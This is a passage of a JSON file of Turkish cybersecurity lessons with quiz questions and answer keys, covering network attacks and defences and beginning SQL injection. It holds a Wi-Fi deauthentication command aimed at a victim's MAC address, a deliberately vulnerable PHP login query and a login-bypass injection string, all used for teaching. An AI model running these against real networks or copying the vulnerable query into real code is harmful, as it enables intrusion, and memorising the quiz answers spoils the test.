          "q": "Rogue DHCP (Sahte DHCP) saldırısının temel amacı nedir?",
          "options": [
            "Ağ hızını artırmak",
            "Kurbanları kendi kontrolündeki sahte ağ geçidine yönlendirip trafiği dinlemek",
            "Şifreleri kaba kuvvetle kırmak",
            "Web sunucusunu çökertmek"
          ],
          "correct": 1
        },
        {
          "q": "Switch'lerde sahte DHCP sunucularını engellemek için hangi güvenlik özelliği kullanılmalıdır?",
          "options": [
            "Port Security",
            "DHCP Snooping",
            "VLAN Trunking",
            "Dynamic ARP Inspection"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-18",
      "title": "DNS Spoofing (DNS Önbellek Zehirlenmesi)",
      "content": "<h2>DNS Spoofing (DNS Cache Poisoning)</h2><p>DNS Spoofing, kurbanın DNS çözümleme isteklerine sahte yanıtlar vererek onu gitmek istediği gerçek web sitesi (örn. <code>banka.com</code>) yerine saldırganın hazırladığı sahte bir web sitesine (phishing sayfası) yönlendirme saldırısıdır.</p><p>Saldırgan yerel ağda ARP zehirlenmesi yaptıktan sonra kurbanın DNS sorgularını yakalar ve gerçek DNS sunucusundan önce sahte bir yanıt paketini kurbana gönderir.</p>",
      "example": "<h3>Analiz:</h3><p>Kurban tarayıcısına <code>google.com</code> yazar, bilgisayarı IP'sini sorgular. Araya giren saldırgan kurbana kendi IP'sini (örn. 192.168.1.50) döner. Kurbanın ekranında Google görünümlü sahte bir sayfa açılır.</p>",
      "questions": [
        {
          "q": "Kullanıcının alan adı sorgularına sahte IP yanıtları dönerek onu sahte sitelere yönlendiren saldırı türü hangisidir?",
          "options": [
            "ARP Spoofing",
            "DNS Spoofing (Cache Poisoning)",
            "MAC Flooding",
            "DHCP Starvation"
          ],
          "correct": 1
        },
        {
          "q": "DNS Spoofing saldırısına uğrayan bir kullanıcının tarayıcısında genellikle hangi uyarı veya durum oluşur?",
          "options": [
            "İnternet bağlantısı tamamen kopar",
            "Girdiği adres çubuğunda SSL/TLS sertifika hatası (Güvensiz Bağlantı) uyarısı çıkabilir",
            "Bilgisayarı aniden yeniden başlar",
            "DNS sunucusu çöker"
          ],
          "correct": 1
        },
        {
          "q": "DNS sorgularının şifrelenmesini ve doğrulanmasını sağlayan güvenlik teknolojisi hangisidir?",
          "options": [
            "DNSSEC / DoH (DNS over HTTPS)",
            "DHCP Snooping",
            "WPA3",
            "NAT"
          ],
          "correct": 0
        }
      ]
    },
    {
      "id": "ag-19",
      "title": "Firewall (Güvenlik Duvarı) Türleri",
      "content": "<h2>Firewall (Güvenlik Duvarı) Türleri</h2><p>Firewall, ağa gelen ve ağdan giden trafiği önceden tanımlanmış güvenlik kurallarına göre denetleyen ve filtreleyen yazılım veya donanım sistemidir.</p><p>Temel Güvenlik Duvarı Türleri:</p><ul><li><strong>Paket Filtreleme (Packet Filtering):</strong> Paketlerin sadece kaynak/hedef IP ve port numaralarını kontrol eder (Stateless). Hızlıdır ama içerik analizi yapamaz.</li><li><strong>Durumsal Denetim (Stateful Inspection):</strong> Bağlantının durumunu (aktif el sıkışmalar, oturum geçmişi) takip eder. Daha güvenlidir.</li><li><strong>Yeni Nesil Güvenlik Duvarı (NGFW):</strong> Uygulama katmanındaki veriyi de inceler (Deep Packet Inspection), kullanıcı rollerini tanır ve entegre IPS barındırır.</li></ul>",
      "example": "<h3>Kural Yapısı:</h3><p>Bir firewall kuralı: <i>'Dış ağdan (WAN) iç ağdaki (LAN) Port 22'ye (SSH) gelen tüm bağlantıları ENGELLE (DENY)'</i> şeklinde tanımlanarak dışarıdan SSH sızmaları önlenir.</p>",
      "questions": [
        {
          "q": "Bağlantının durumunu ve aktif oturum tablolarını takip ederek filtreleme yapan firewall türü hangisidir?",
          "options": [
            "Stateless Packet Filtering",
            "Stateful Inspection (Durumsal Denetim)",
            "Proxy Firewall",
            "Simple Hub"
          ],
          "correct": 1
        },
        {
          "q": "Derin Paket İncelemesi (DPI) yapabilen ve uygulama katmanındaki trafiği süzebilen modern firewall sınıfı hangisidir?",
          "options": [
            "Paket Filtreleyici",
            "NGFW (Next Generation Firewall)",
            "NAT Cihazı",
            "Stateless Firewall"
          ],
          "correct": 1
        },
        {
          "q": "Firewall kurallarında genellikle varsayılan yaklaşım (Default Policy) ne olmalıdır?",
          "options": [
            "Her şeye izin ver, şüphelileri engelle",
            "Her şeyi engelle, sadece gerekli olanlara izin ver (Implicit Deny)",
            "Tüm portları açık bırak",
            "Sadece IP bazlı filtreleme yap"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-20",
      "title": "IDS ve IPS Sistemleri",
      "content": "<h2>IDS ve IPS Sistemleri</h2><p>IDS ve IPS, ağdaki zararlı aktiviteleri ve siber saldırıları tespit etmek için kullanılan güvenlik teknolojileridir.</p><p><strong>IDS (Intrusion Detection System - Saldırı Tespit Sistemi):</strong> Ağ trafiğini kopyalayarak pasif olarak izler. Şüpheli bir imza veya anormal hareket gördüğünde sadece <strong>alarm üretir</strong>, trafiği engellemez.</p><p><strong>IPS (Intrusion Prevention System - Saldırı Engelleme Sistemi):</strong> Ağ hattının üzerinde (inline) aktif olarak çalışır. Saldırıyı tespit ettiği anda paketleri drop ederek saldırıyı <strong>anında engeller</strong>.</p>",
      "example": "<h3>Çalışma Yöntemleri:</h3><p>İki yöntem kullanılır: <strong>İmza Tabanlı (Signature-based)</strong> (bilinen virüs/saldırı kalıplarını arar) ve <strong>Anomali Tabanlı (Anomaly-based)</strong> (normal ağ davranışını öğrenip bunun dışındaki sapmaları raporlar).</p>",
      "questions": [
        {
          "q": "IDS ve IPS arasındaki en temel fark hangisidir?",
          "options": [
            "IDS daha hızlıdır",
            "IDS sadece tespit edip alarm üretir, IPS ise aktif olarak engeller",
            "IPS sadece kablosuz ağlarda çalışır",
            "IDS işletim sistemlerini tespit eder"
          ],
          "correct": 1
        },
        {
          "q": "Ağda daha önce hiç görülmemiş (Zero-day) bir saldırıyı tespit etmek için hangi IDS/IPS analiz yöntemi daha uygundur?",
          "options": [
            "İmza Tabanlı (Signature-based)",
            "Anomali Tabanlı (Anomaly-based)",
            "Kaba Kuvvet Tabanlı",
            "Port Tabanlı"
          ],
          "correct": 1
        },
        {
          "q": "Ağ trafiğinin üzerinde doğrudan (inline) durarak paketleri bloke edebilen sistem hangisidir?",
          "options": [
            "IDS",
            "Honeypot",
            "IPS",
            "Wireshark"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-21",
      "title": "VPN Teknolojileri",
      "content": "<h2>VPN (Virtual Private Network) Teknolojileri</h2><p>VPN, güvensiz veya halka açık ağlar üzerinden (örneğin internet) şifreli ve güvenli tüneller oluşturarak özel ağlara uzaktan erişim sağlayan teknolojidir.</p><p>Temel VPN Protokolleri:</p><ul><li><strong>IPsec:</strong> Ağ katmanında şifreleme sunar. Çok güvenlidir ve şirketler arası (Site-to-Site) bağlantılarda sık kullanılır.</li><li><strong>OpenVPN:</strong> SSL/TLS tabanlı, açık kaynaklı, esnek ve güvenli bir protokoldür. TCP veya UDP üzerinden çalışabilir.</li><li><strong>WireGuard:</strong> Son derece hafif, modern, hızlı ve yüksek kriptografik güvenliğe sahip yeni nesil VPN protokolüdür.</li></ul>",
      "example": "<h3>Kullanım Senaryosu:</h3><p>Bir çalışan evindeki güvensiz internet hattı üzerinden şirket kaynaklarına erişirken VPN başlatır. Böylece evdeki internet servis sağlayıcı veya olası bir MITM saldırganı şirkete giden verileri şifreli olduğu için okuyamaz.</p>",
      "questions": [
        {
          "q": "VPN (Sanal Özel Ağ) teknolojisinin sağladığı en temel güvenlik unsuru hangisidir?",
          "options": [
            "Bilgisayarın hızını artırmak",
            "Veri trafiğini şifreleyerek gizlilik ve bütünlük sağlamak",
            "Açık portları kapatmak",
            "Virüsleri temizlemek"
          ],
          "correct": 1
        },
        {
          "q": "SSL/TLS tabanlı, açık kaynak kodlu ve en yaygın kullanılan VPN protokollerinden biri hangisidir?",
          "options": [
            "Telnet",
            "OpenVPN",
            "FTP",
            "WEP"
          ],
          "correct": 1
        },
        {
          "q": "Yeni nesil, son derece hızlı ve hafif olan modern VPN protokolü hangisidir?",
          "options": [
            "PPTP",
            "L2TP",
            "WireGuard",
            "IPsec"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-22",
      "title": "Wi-Fi Şifreleme Protokolleri",
      "content": "<h2>Wi-Fi Şifreleme Protokolleri (WEP, WPA2, WPA3)</h2><p>Kablosuz ağlar havadan yayın yaptığı için verinin şifrelenmesi şarttır. Yıllar içinde farklı şifreleme protokolleri geliştirilmiştir:</p><ul><li><strong>WEP (Wired Equivalent Privacy):</strong> En eski ve en zayıf protokoldür. RC4 algoritmasındaki zayıflık nedeniyle dakikalar içinde şifresi kırılabilir. Kesinlikle kullanılmamalıdır.</li><li><strong>WPA2:</strong> Güçlü <strong>AES (Advanced Encryption Standard)</strong> şifreleme algoritmasını kullanır. Günümüzde en yaygın olanıdır ancak KRACK ve kaba kuvvet saldırılarına karşı bazı açıkları vardır.</li><li><strong>WPA3:</strong> En güncel ve güvenli protokoldür. Eş zamanlı kimlik doğrulama (SAE) kullanarak sözlük saldırılarını engeller ve iletim güvenliği sunar.</li></ul>",
      "example": "<h3>Saldırı Analizi:</h3><p>WPA2 ağlarda el sıkışma (handshake) paketleri havadan yakalanarak bilgisayarda çevrimdışı (offline) sözlük saldırısıyla kırılmaya çalışılabilir. WPA3'te ise bu kaba kuvvet saldırıları teknik olarak engellenmiştir.</p>",
      "questions": [
        {
          "q": "RC4 algoritmasındaki zayıflıklar nedeniyle saniyeler içinde şifresi kırılabilen, günümüzde kullanılmaması gereken eski kablosuz şifreleme protokolü hangisidir?",
          "options": [
            "WPA2",
            "WPA3",
            "WEP",
            "AES"
          ],
          "correct": 2
        },
        {
          "q": "WPA2 protokolü şifreleme standardı olarak hangi güçlü algoritmayı temel alır?",
          "options": [
            "RC4",
            "MD5",
            "AES",
            "DES"
          ],
          "correct": 2
        },
        {
          "q": "WPA3 protokolünün WPA2'ye göre getirdiği en büyük güvenlik iyileştirmesi nedir?",
          "options": [
            "Daha yüksek Wi-Fi hızı sunması",
            "Çevrimdışı şifre kırma (sözlük/brute-force) saldırılarını engellemesi",
            "Sadece telefonlarda çalışması",
            "Şifresiz bağlantı sunması"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-23",
      "title": "Deauth (Bağlantı Kesme) Saldırıları",
      "content": "<h2>Deauth (Deauthentication) Saldırıları</h2><p>Kablosuz ağlarda (802.11), cihazların erişim noktasından (Access Point) bağlantısını kesmek için kullanılan özel yönetim paketleri (Deauth Frames) vardır. Bu paketler şifrelenmemiş olarak havadan gönderilir.</p><p>Bir saldırgan, hedef cihazın MAC adresini taklit ederek erişim noktasına sahte bağlantı kesme paketi gönderir veya tam tersini yapar. Sonuç olarak kurbanın Wi-Fi bağlantısı anında kopar. Saldırgan bu yöntemi <strong>WPA2 el sıkışma (handshake)</strong> paketini yakalamak veya kullanıcıyı sahte bir Wi-Fi ağına (Evil Twin) yönlendirmek için kullanır.</p>",
      "example": "<h3>Kali Linux Komutu:</h3><p>Saldırgan <code>aireplay-ng --deauth 10 -a [AP_MAC] -c [KURBAN_MAC] wlan0mon</code> komutunu çalıştırarak kurbanın Wi-Fi bağlantısını keser.</p>",
      "questions": [
        {
          "q": "Deauth saldırısının temel çalışma mekanizması nedir?",
          "options": [
            "Wi-Fi şifresini tahmin etmek",
            "Wi-Fi yönetim paketlerinin (management frames) şifresiz olmasını suistimal ederek sahte bağlantı kesme istekleri göndermek",
            "Erişim noktasının elektriğini kesmek",
            "IP adresini çalmak"
          ],
          "correct": 1
        },
        {
          "q": "Saldırganlar neden bir Wi-Fi ağına Deauth saldırısı düzenler?",
          "options": [
            "Modemi çökertip bozmak için",
            "Kurbanın bağlantısı koptuğunda yeniden bağlanırken WPA2 el sıkışma (handshake) paketini yakalamak için",
            "İnterneti hızlandırmak için",
            "IP çakışması yaratmak için"
          ],
          "correct": 1
        },
        {
          "q": "Deauth saldırılarını engellemek için geliştirilen kablosuz ağ standardı hangisidir?",
          "options": [
            "802.3 Ethernet",
            "802.11w (Korumalı Yönetim Çerçeveleri - PMF)",
            "802.1X",
            "WEP"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-24",
      "title": "WPS Açıklıkları ve Pixie Dust",
      "content": "<h2>WPS Açıklıkları ve Pixie Dust Saldırısı</h2><p><strong>WPS (Wi-Fi Protected Setup):</strong> Kullanıcıların karmaşık Wi-Fi şifrelerini girmeden, 8 haneli basit bir PIN koduyla ağa kolayca bağlanmasını sağlayan bir teknolojidir.</p><p><strong>Güvenlik Riski:</strong> 8 haneli PIN kodu arka planda 4 ve 4 haneli iki ayrı parça olarak doğrulanır. Bu durum saldırganın denemesi gereken olasılık sayısını 100 milyondan sadece 11 bine düşürür. Kaba kuvvetle PIN kodu kolayca kırılır.</p><p><strong>Pixie Dust Saldırısı:</strong> Erişim noktasının zayıf rastgele sayı üretecini (PRNG) suistimal ederek, tek bir istek paketiyle PIN kodunu çevrimdışı (offline) olarak saniyeler içinde çözen gelişmiş bir saldırıdır.</p>",
      "example": "<h3>Güvenlik Önlemi:</h3><p>Modem ve erişim noktalarının ayarlarından <strong>WPS (Wi-Fi Korumalı Kurulum)</strong> özelliği tamamen kapatılmalıdır.</p>",
      "questions": [
        {
          "q": "WPS (Wi-Fi Protected Setup) özelliğinin siber güvenlik açısından en büyük riski nedir?",
          "options": [
            "İnterneti yavaşlatması",
            "8 haneli PIN kodunun kaba kuvvetle kolayca kırılabilmesi",
            "Sadece eski bilgisayarlarda çalışması",
            "Şifreyi her gün değiştirmesi"
          ],
          "correct": 1
        },
        {
          "q": "WPS PIN kodunu çevrimdışı ve saniyeler içinde çözen gelişmiş saldırı türü hangisidir?",
          "options": [
            "Evil Twin",
            "KRACK",
            "Pixie Dust",
            "Deauth"
          ],
          "correct": 2
        },
        {
          "q": "Bu saldırılardan korunmak için modem ayarlarında ne yapılmalıdır?",
          "options": [
            "WPA2 şifresi uzatılmalı",
            "WPS özelliği tamamen devre dışı bırakılmalı",
            "Modem kapatılmalı",
            "DHCP kapatılmalı"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-25",
      "title": "Ağ Trafiğinde Şifreleme (SSL/TLS)",
      "content": "<h2>Ağ Trafiğinde Şifreleme (SSL/TLS)</h2><p>SSL (Secure Sockets Layer) ve onun daha modern ve güvenli ardılı olan <strong>TLS (Transport Layer Security)</strong>, ağ trafiğindeki verilerin gizliliğini ve bütünlüğünü korumak için taşıma katmanı üzerinde şifreli tüneller oluşturan kriptografik protokollerdir.</p><p>Çalışma Mantığı:</p><ol><li><strong>Handshake (El Sıkışma):</strong> Tarayıcı ve sunucu destekledikleri şifreleme algoritmalarını paylaşır, sunucu SSL sertifikasını sunar.</li><li><strong>Anahtar Değişimi:</strong> Simetrik şifreleme için kullanılacak olan geçici oturum anahtarı güvenli bir şekilde oluşturulur.</li><li><strong>Şifreli İletişim:</strong> Tüm HTTP trafiği bu simetrik anahtarla şifrelenerek taşınır (HTTPS).</li></ol>",
      "example": "<h3>Örnek:</h3><p>Bir e-ticaret sitesine kredi kartı bilginizi girdiğinizde, tarayıcı ile sunucu arasındaki TLS tüneli sayesinde kart bilginiz ağ kablosundan şifreli olarak geçer. Araya giren biri kart numarasını göremez.</p>",
      "questions": [
        {
          "q": "SSL/TLS protokolünün ağ iletişimine sağladığı en kritik iki güvenlik unsuru hangisidir?",
          "options": [
            "Hız ve bant genişliği",
            "Gizlilik (Şifreleme) ve Bütünlük (Veri değiştirilemezliği)",
            "IP gizleme ve yönlendirme",
            "Port kapatma ve antivirüs"
          ],
          "correct": 1
        },
        {
          "q": "SSL protokolünün güncel, güvenli ve aktif olarak kullanılan modern sürümü hangisidir?",
          "options": [
            "WEP",
            "TLS",
            "HTTP",
            "MD5"
          ],
          "correct": 1
        },
        {
          "q": "TLS el sıkışması tamamlandıktan sonra verilerin şifrelenmesinde hangi şifreleme türü kullanılır?",
          "options": [
            "Asimetrik Şifreleme",
            "Simetrik Şifreleme (Oturum Anahtarı)",
            "Özetleme (Hashing)",
            "Sezar Şifrelemesi"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-26",
      "title": "SSH Tünelleme ve Port Yönlendirme",
      "content": "<h2>SSH Tünelleme ve Port Yönlendirme (Port Forwarding)</h2><p>SSH tünelleme, SSH protokolünü kullanarak güvensiz bir ağ üzerinden başka bir ağ servisinin trafiğini güvenli ve şifreli bir şekilde taşıma (encapsulation) yöntemidir.</p><p>Üç Türlü Port Yönlendirme Vardır:</p><ul><li><strong>Yerel Port Yönlendirme (Local Port Forwarding):</strong> Kendi bilgisayarınızdaki bir portu, SSH sunucusu üzerinden hedef ağdaki bir porta yönlendirir.</li><li><strong>Uzak Port Yönlendirme (Remote Port Forwarding):</strong> SSH sunucusundaki bir portu, kendi bilgisayarınızdaki bir porta yönlendirir (Dışarıdan içeri sızma için kullanılır).</li><li><strong>Dinamik Port Yönlendirme:</strong> Bilgisayarınızda bir SOCKS proxy oluşturarak tüm tarayıcı trafiğini SSH üzerinden geçirir.</li></ul>",
      "example": "<h3>Komut Örneği:</h3><p>Dışarıya kapalı olan yerel bir web sunucusunu (port 80), kendi localhost:8080 portunuza tünellemek için: <code>ssh -L 8080:localhost:80 user@ssh-server</code> kullanılır.</p>",
      "questions": [
        {
          "q": "SSH tünelleme işlemi genel olarak ne amaçla kullanılır?",
          "options": [
            "Şifre kırmak için",
            "Ağ trafiğini şifreli bir tünel üzerinden güvenle taşımak veya güvenlik duvarlarını aşmak için",
            "Modemi yeniden başlatmak için",
            "Port taramasını engellemek için"
          ],
          "correct": 1
        },
        {
          "q": "Kendi bilgisayarınızda bir SOCKS proxy yaratarak tüm trafiği SSH üzerinden yönlendiren tünelleme türü hangisidir?",
          "options": [
            "Yerel Port Yönlendirme",
            "Uzak Port Yönlendirme",
            "Dinamik Port Yönlendirme",
            "Statik Yönlendirme"
          ],
          "correct": 2
        },
        {
          "q": "Uzak bir SSH sunucusundaki portu kendi bilgisayarınıza tünellemek için hangi SSH parametresi kullanılır?",
          "options": [
            "-L (Local)",
            "-R (Remote)",
            "-D (Dynamic)",
            "-p"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-27",
      "title": "VLAN ve VLAN Hopping Saldırıları",
      "content": "<h2>VLAN ve VLAN Hopping Saldırıları</h2><p><strong>VLAN (Virtual Local Area Network - Sanal Yerel Ağ):</strong> Fiziksel bir ağı mantıksal olarak alt ağlara bölerek trafiği izole eden switch teknolojisidir. Farklı departmanların (örn. İK ve Muhasebe) trafiği birbirini göremez.</p><p><strong>VLAN Hopping (VLAN Atlama):</strong> Bir saldırganın, üye olmadığı başka bir VLAN'ın trafiğine sızması veya o VLAN'a paket göndermesi saldırısıdır.</p><p>Yöntemler:</p><ul><li><strong>Switch Spoofing:</strong> Saldırganın bilgisayarını switch gibi gösterip trunk bağlantısı kurması (DTP protokolü açıksa).</li><li><strong>Double Tagging (Çift Etiketleme):</strong> Pakete üst üste iki VLAN etiketi ekleyerek switch'i kandırma ve hedef VLAN'a paket iletme.</li></ul>",
      "example": "<h3>Korunma:</h3><p>Switch'lerde kullanılmayan portlar kapatılmalı, DTP (Dynamic Trunking Protocol) devre dışı bırakılmalı ve varsayılan VLAN 1 yerine başka bir Native VLAN belirlenmelidir.</p>",
      "questions": [
        {
          "q": "Ağ trafiğini mantıksal olarak izole etmek ve departmanları birbirinden ayırmak için switch üzerinde kurulan teknoloji hangisidir?",
          "options": [
            "VLAN",
            "VPN",
            "DHCP",
            "NAT"
          ],
          "correct": 0
        },
        {
          "q": "Saldırganın bilgisayarını bir switch gibi tanıtarak trunk bağlantısı kurmaya çalıştığı VLAN atlama saldırısı hangisidir?",
          "options": [
            "Double Tagging",
            "Switch Spoofing",
            "ARP Spoofing",
            "MAC Flooding"
          ],
          "correct": 1
        },
        {
          "q": "VLAN Hopping saldırılarını engellemek için switch yapılandırmasında ne yapılmalıdır?",
          "options": [
            "Tüm portlar trunk yapılmalı",
            "DTP (Dynamic Trunking Protocol) kapatılmalı ve Native VLAN 1 değiştirilmeli",
            "DHCP devre dışı bırakılmalı",
            "IP adresleri statik yapılmalı"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-28",
      "title": "DDoS ve DoS Saldırı Çeşitleri",
      "content": "<h2>DDoS ve DoS Saldırı Çeşitleri</h2><p>DoS (Denial of Service) ve dağıtık mimarili <strong>DDoS (Distributed Denial of Service)</strong>, hedef sistemin kaynaklarını (CPU, RAM, bant genişliği) tüketerek yasal kullanıcılara hizmet veremez hale getirilmesi saldırılarıdır.</p><p>Sık Kullanılan Saldırı Çeşitleri:</p><ul><li><strong>SYN Flood:</strong> Sunucuya çok sayıda sahte SYN isteği gönderilir. Sunucu SYN-ACK döner ve yanıt (ACK) bekler. Bağlantılar açık kalır ve sunucu kaynakları tükenir (Yarım açık bağlantı saldırısı).</li><li><strong>UDP Flood:</strong> Hedef portlara çok sayıda UDP paketi gönderilerek ağ bant genişliği doldurulur.</li><li><strong>HTTP Flood:</strong> Web sunucusuna yoğun Get/Post istekleri atılarak web uygulamasının kilitlenmesi sağlanır (Katman 7 saldırısı).</li></ul>",
      "example": "<h3>Botnet kavramı:</h3><p>DDoS saldırıları genellikle saldırganın kontrolündeki binlerce zombi bilgisayardan (Botnet) oluşan bir ağ üzerinden tek bir hedefe yönelik başlatılır.</p>",
      "questions": [
        {
          "q": "Sunucuya sürekli SYN paketi gönderip el sıkışmayı tamamlamayarak sunucu kaynaklarını tüketen DoS saldırısı hangisidir?",
          "options": [
            "UDP Flood",
            "SYN Flood",
            "Ping of Death",
            "Slowloris"
          ],
          "correct": 1
        },
        {
          "q": "DDoS saldırılarında saldırganın kontrolü altındaki virüslü/zombi bilgisayarlar ordusuna ne ad verilir?",
          "options": [
            "Honeypot",
            "Botnet",
            "IDS",
            "Firewall"
          ],
          "correct": 1
        },
        {
          "q": "Web sunucusuna yoğun HTTP GET istekleri göndererek uygulama katmanını kilitleyen saldırı türü hangisidir?",
          "options": [
            "SYN Flood",
            "ICMP Flood",
            "HTTP Flood",
            "ARP Spoofing"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-29",
      "title": "Honeypot (Bal Küpü) Teknolojisi",
      "content": "<h2>Honeypot (Bal Küpü) Teknolojisi</h2><p>Honeypot, siber saldırganları cezbetmek, onların saldırı yöntemlerini analiz etmek ve ana sistemleri korumak için bilerek zafiyetli bırakılmış sahte sistem veya ağ ortamıdır.</p><p>Özellikleri:</p><ul><li>Üretim sistemlerinden izole edilmiştir.</li><li>Gerçek hiçbir ticari veya hassas veri barındırmaz.</li><li>Honeypot'a gelen her türlü trafik veya bağlantı girişimi doğrudan şüpheli / zararlı kabul edilir, çünkü yasal kullanıcıların bu sahte sistemle işi yoktur.</li></ul>",
      "example": "<h3>Kullanım Alanı:</h3><p>Ağda zayıf şifreli sahte bir SSH sunucusu (Honeypot) kurulur. Saldırgan bu SSH portuna kaba kuvvet saldırısı yaptığında, tüm denediği şifreler ve IP adresi anında güvenlik ekipleri tarafından kaydedilir.</p>",
      "questions": [
        {
          "q": "Saldırganları tuzaklamak ve analiz etmek amacıyla bilerek kurulan sahte zafiyetli sistemlere ne ad verilir?",
          "options": [
            "Firewall",
            "Honeypot (Bal Küpü)",
            "IDS",
            "Backdoor"
          ],
          "correct": 1
        },
        {
          "q": "Honeypot sistemlerinin siber güvenlik analizine en büyük katkısı nedir?",
          "options": [
            "Saldırıları tamamen engellemesi",
            "Saldırganların IP adreslerini, kullandıkları araçları ve exploit yöntemlerini güvenli bir ortamda kaydetmek",
            "Ağ kartlarını hızlandırması",
            "Şifreleri otomatik kırması"
          ],
          "correct": 1
        },
        {
          "q": "Honeypot'a gelen bir bağlantı isteği hakkında ne söylenebilir?",
          "options": [
            "Yasal bir kullanıcıdır",
            "Doğrudan şüpheli/saldırı girişimi olarak kabul edilir",
            "E-posta trafiğidir",
            "DNS sorgusudur"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-30",
      "title": "Ağ Güvenliğinde Sıfır Güven (Zero Trust)",
      "content": "<h2>Sıfır Güven (Zero Trust) Mimarisi</h2><p>Geleneksel ağ güvenliği 'Kale ve Hendek' modelini kullanır: Ağın dışı tehlikeli, içi ise güvenlidir. Ancak içeri sızan bir saldırgan ağda serbestçe hareket edebilir.</p><p><strong>Sıfır Güven (Zero Trust) Modeli:</strong> 'Asla güvenme, her zaman doğrula' prensibine dayanır. Ağın içinde veya dışında olmasına bakılmaksızın, her cihaz ve kullanıcı her işlemde sürekli olarak doğrulanır ve yetkilendirilir. Ağ içi yatay hareketleri (Lateral Movement) engellemek için ağ mikro-bölümlere (micro-segmentation) ayrılır.</p>",
      "example": "<h3>Uygulama:</h3><p>Zero Trust mimarisinde, şirket bilgisayarıyla ofisteki yerel ağa bağlansanız dahi, şirket içi kaynaklara erişmek için tekrar iki aşamalı doğrulama (MFA) yapmanız ve cihazınızın güvenlik taramasından geçmesi istenir.</p>",
      "questions": [
        {
          "q": "Zero Trust (Sıfır Güven) mimarisinin temel sloganı/prensibi hangisidir?",
          "options": [
            "İçeridekilere güven, dışarıdakileri doğrula",
            "Asla güvenme, her zaman doğrula (Never trust, always verify)",
            "Sadece güçlü şifreler kullan",
            "Tüm portları açık tut"
          ],
          "correct": 1
        },
        {
          "q": "Zero Trust modelinde saldırganın ağ içinde serbestçe yatay hareket etmesini (lateral movement) zorlaştırmak için kullanılan yöntem hangisidir?",
          "options": [
            "Mikro-bölümleme (Micro-segmentation)",
            "Daha büyük alt ağlar oluşturmak",
            "Sadece VPN kullanmak",
            "Antivirüs kurmak"
          ],
          "correct": 0
        },
        {
          "q": "Aşağıdakilerden hangisi Zero Trust mimarisinin temel bileşenlerinden biri değildir?",
          "options": [
            "Çok Faktörlü Kimlik Doğrulama (MFA)",
            "Cihaz Sağlık Kontrolü",
            "Sınırsız Süreli Güvenilir Ağ İçi Erişim Yetkisi",
            "En Düşük Yetki Prensibi (Least Privilege)"
          ],
          "correct": 2
        }
      ]
    }
  ],
  "uyg-guvenligi": [
    {
      "id": "uyg-01",
      "title": "OWASP Top 10 Nedir?",
      "content": "<h2>OWASP Top 10 ve Uygulama Güvenliği</h2><p>OWASP (Open Web Application Security Project), web uygulama güvenliğini artırmak için çalışan küresel ve tarafsız bir topluluktur.</p><p><strong>OWASP Top 10:</strong> Web uygulamalarında en sık karşılaşılan ve en kritik 10 güvenlik riskini listeleyen, dünya çapında kabul görmüş bir standarttır. Bu liste düzenli olarak güncellenir ve geliştiricilere, güvenlik uzmanlarına uygulamalarını nasıl koruyacaklarını öğretir. SQL Injection, XSS, Yetkilendirme Hataları ve Güvenlik Duvarı Yapılandırmaları bu listede üst sıralarda yer alır.</p>",
      "example": "<h3>Önemli Çıktı:</h3><p>Geliştirilen her web uygulamasının güvenlik testleri (SAST/DAST) OWASP Top 10 standartlarına göre yapılır. Bu standartları bilmek, web güvenliği kariyerinin temel taşıdır.</p>",
      "questions": [
        {
          "q": "OWASP topluluğunun temel amacı nedir?",
          "options": [
            "İşletim sistemleri yazmak",
            "Web uygulama güvenliğini ve standartlarını artırmak",
            "Arama motoru geliştirmek",
            "Hosting hizmeti sunmak"
          ],
          "correct": 1
        },
        {
          "q": "OWASP Top 10 listesi neyi ifade eder?",
          "options": [
            "En popüler 10 programlama dilini",
            "Web uygulamalarındaki en kritik 10 güvenlik riskini",
            "En çok ziyaret edilen 10 web sitesini",
            "En güvenli 10 tarayıcıyı"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdaki zafiyetlerden hangisi genellikle OWASP Top 10 listesinin en kritik başlıkları arasında yer alır?",
          "options": [
            "Yavaş internet bağlantısı",
            "Enjeksiyon (Injection) Açıklıkları",
            "CSS dosya hataları",
            "Responsive tasarım eksikliği"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-02",
      "title": "SQL Injection (SQLi) Temelleri",
      "content": "<h2>SQL Injection (SQLi) Nedir?</h2><p>SQL Injection, saldırganın uygulama girdilerine zararlı SQL komutları enjekte ederek, arka plandaki veritabanı sorgularının yapısını değiştirdiği ve veritabanına yetkisiz erişim sağladığı en eski ve tehlikeli zafiyetlerden biridir.</p><p>Zafiyet, kullanıcıdan alınan verilerin parametrik sorgular (Prepared Statements) yerine, string birleştirme yoluyla doğrudan SQL sorgusuna eklenmesinden kaynaklanır.</p>",
      "example": "<h3>Zafiyetli Kod Örneği (PHP):</h3><pre><code>$query = \"SELECT * FROM users WHERE user = '\" . $_POST['username'] . \"' AND pass = '\" . $_POST['password'] . \"'\";</code></pre><p>Saldırgan kullanıcı adı alanına <code>admin' OR '1'='1</code> yazdığında sorgu şuna dönüşür: <code>SELECT * FROM users WHERE user = 'admin' OR '1'='1' ...</code> ve şifre kontrolü bypass edilir.</p>",
      "questions": [
        {
          "q": "SQL Injection zafiyetinin temel ortaya çıkış nedeni nedir?",
          "options": [
            "Veritabanının çok eski olması",
            "Kullanıcı girdilerinin temizlenmeden sorgu stringi ile birleştirilip SQL motoruna gönderilmesi",
            "Şifrelerin karmaşık olmaması",
            "HTTPS şifrelemesinin kullanılmaması"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdakilerden hangisi SQL Injection açıklarından korunmanın en etkili yoludur?",
          "options": [
            "Antivirüs kullanmak",
            "Parametrik Sorgular (Prepared Statements) kullanmak",
            "JavaScript ile girdileri kontrol etmek",
            "Veritabanını şifrelemek"
          ],
          "correct": 1
        },
        {
          "q": "Zafiyetli bir giriş panelinde kullanıcı adı alanına 'OR 1=1' yazıldığında ne amaçlanır?",
          "options": [
